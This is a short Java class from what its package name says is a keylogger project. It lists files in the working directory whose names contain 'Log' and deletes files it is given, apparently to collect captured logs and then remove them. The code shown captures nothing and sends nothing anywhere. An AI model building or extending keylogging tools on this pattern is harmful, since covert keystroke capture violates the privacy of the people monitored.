package com.mossad.keylogger.files;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.List;
import java.util.logging.Logger;
import java.util.stream.Collectors;
import java.util.stream.Stream;

import static kisonar.platform.domain.BaseDefinitions.EMPTY;

public final class LogFilesCollector {

    private final Logger LOG = Logger.getLogger(LogFilesCollector.class.getCanonicalName());

    public LogFilesCollector() {
    }

    public List<String> collectLogs() {
        File currentDirectory = new File(new File(EMPTY).getAbsolutePath());
        String pathAsString = currentDirectory.getAbsolutePath();
        try {
            Stream<Path> paths = Files.list(Paths.get(pathAsString));
            return paths.map(path -> path.toString()).filter(path -> !path.endsWith(".lck") && path.contains("Log"))
                    .collect(Collectors.toList());

        } catch (IOException e) {
            LOG.warning(String.format("Cannot collect logs %s", e.getMessage()));
            return List.of();
        }
    }

    public void removeLogs(List<String> filesNames) {
        filesNames.forEach(path -> {
            try {
                Files.delete(Paths.get(path));
            } catch (IOException e) {
                LOG.warning(String.format("Cannot remove logs %s", e.getMessage()));
            }
        });
    }
}
